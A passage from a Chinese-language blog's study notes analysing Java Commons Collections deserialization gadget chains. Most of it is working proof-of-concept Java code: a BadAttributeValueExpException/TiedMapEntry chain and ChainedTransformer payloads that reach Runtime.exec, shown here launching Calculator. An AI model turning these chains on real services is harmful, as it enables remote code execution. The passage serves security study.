class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7ED3;&#x5408;&#x4E00;&#x4E9B; CC5 &#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x6765;&#x5B8C;&#x6574;&#x7684; gadget</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC9</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="hljs-keyword">new</span> TiedMapEntry(mapDemo, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Field valDemo = Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);</span><br><span class="line">        valDemo.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        valDemo.set(finaldemo, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212213711575.png" alt></p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>&#x590D;&#x73B0;&#x5206;&#x6790;&#x5B8C; CC &#x540E;&#x7684;&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;</p>
<p><strong>&#x6316;&#x6398;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;</strong></p>
<p>&#x6316;&#x6398;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x627E;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x91CC;&#x9762;&#x53CD;&#x5C04;&#x8C03;&#x7528; <code>java.lang.Runtime</code>&#xFF0C;&#x89E6;&#x53D1; RCE &#x7684;&#x70B9;&#x53EB; m0 &#x7136;&#x540E;&#x6784;&#x9020;&#x4E00;&#x6BB5;&#x547D;&#x4EE4;&#x6267;&#x884C; Level-0 &#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x968F;&#x540E;&#x6211;&#x4EEC;&#x7EE7;&#x7EED;&#x627E;&#x5BF9;&#x8C61;&#xFF0C;&#x5BFB;&#x627E;&#x5BF9;&#x8C61;&#x91CC;&#x9762;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#x51FA;&#x53D1; m0 &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x53EB;m1&#xFF0C;&#x968F;&#x540E;&#x5F53;&#x524D;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x6709;&#x6CA1;&#x6709;&#x8C03;&#x7528; m1 &#x7684;&#xFF0C;&#x53EF;&#x80FD;&#x6709; m2, m3, m4 &#x7B49;&#x7B49;&#xFF0C;&#x4E4B;&#x540E;&#x518D;&#x627E;&#x4E00;&#x4E2A;&#x7C7B;&#x89E6;&#x53D1; m1, m2, m3, m4 &#x7684;&#x65B9;&#x6CD5;&#x2026;&#x7136;&#x540E;&#x4E0D;&#x65AD;&#x5FAA;&#x73AF;&#xFF0C;&#x76F4;&#x5230;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x7C7B;&#x80FD;&#x6EE1;&#x8DB3;&#xFF1A;</p>
<ol>
<li>&#x8BE5;&#x7C7B;&#x80FD;&#x8C03;&#x7528; xx &#x5BF9;&#x8C61;&#x7684; xx &#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x5FAA;&#x73AF;&#x8C03;&#x7528;&#x5230;&#x6700;&#x540E; RCE &#x7684; Level -0 &#x7684;&#x65B9;&#x6CD5;</li>
<li>&#x8BE5;&#x7C7B;&#x53EF;&#x4EE5;&#x88AB;&#x5E8F;&#x5217;&#x5316;</li>
</ol>
<p><strong>&#x5982;&#x4F55;&#x4F18;&#x96C5;&#x7684;&#x5F39; Calc</strong></p>
<p>&#x95EE;&#x9898;&#x6765;&#x6E90;&#x4E8E;&#x7ECF;&#x5E38;&#x6784;&#x9020;&#x597D;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x70B9;&#x4E4B;&#x540E;&#xFF0C;&#x5728; IDEA &#x4E0B;&#x7ECF;&#x5E38;&#x7F16;&#x8BD1;&#x5668;&#x4F1A;&#x5E2E;&#x6211;&#x4EEC;&#x89E6;&#x53D1;&#x4E00;&#x4E9B; toString &#x7B49;&#x64CD;&#x4F5C;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x8FD8;&#x6CA1;&#x6709;&#x89E6;&#x53D1;&#x5230; readObject&#xFF0C;&#x5C31;&#x7ECF;&#x5E38;&#x5F39; Calc &#x4E86;</p>
<p>@phithon &#x5E08;&#x5085;Java&#x5B89;&#x5168;&#x6F2B;&#x8C08;&#x91CC;&#x7ED9;&#x51FA;&#x7684;&#x7B54;&#x6848;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};</span><br><span class="line">    Transformer[] transformers = &#x4F60;&#x6784;&#x9020;&#x7684; transformers</span><br><span class="line">    Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">    f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// ==================</span></span><br><span class="line">    <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(expMap);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// &#x672C;&#x5730;&#x6D4B;&#x8BD5;&#x89E6;&#x53D1;</span></span><br><span class="line">    System.out.println(barr);</span><br><span class="line">    ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><strong>&#x5173;&#x4E8E; ChainedTransformer &#x6267;&#x884C;&#x591A;&#x6761;&#x547D;&#x4EE4;</strong></p>
<p>&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<a href="https://t.zsxq.com/aufUJEa" target="_blank" rel="noopener">https://t.zsxq.com/aufUJEa</a></p>
<p>RCE demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)}),</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calendar.app/Contents/MacOS/Calendar&quot;</span>)})});</span><br><span class="line">        chainDemo.transform(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211174913454.png" alt></p>
<p><strong>&#x5C0F;&#x7ED3;</strong></p>
<p>&#x901A;&#x8FC7;&#x5BF9; Commons Collections &#x5404;&#x4E2A;&#x94FE;&#x6761;&#x7684;&#x68B3;&#x7406;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x5BF9; Java &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8BA4;&#x8BC6;&#x8D8A;&#x53D1;&#x6DF1;&#x523B;</p>
<p>&#x6CA1;&#x6709;&#x627E;&#x5230;&#x65B0;&#x7684; gadgets &#xFF0C;&#x53CD;&#x5012;&#x5207;&#x6362; Java &#x7248;&#x672C;&#x8D8A;&#x53D1;&#x5A34;&#x719F;<img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211180848445.png" alt="image-20210211180848445"></p>
<p><strong>&#x672C;&#x7BC7;&#x4F5C;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;&#xFF0C;&#x53C2;&#x8003;&#x4E86;&#x8BF8;&#x591A;&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x5199;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x4E0D;&#x662F;&#x4E00;&#x6C14;&#x5475;&#x6210;&#xFF0C;&#x5982;&#x6587;&#x4E2D;&#x6709;&#x9519;&#x8BEF;&#x8BF7;&#x4E0D;&#x541D;&#x8D50;&#x6559;</strong></p>
</body></html>]]></content>
      <categories>
        <category>Java Sec</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
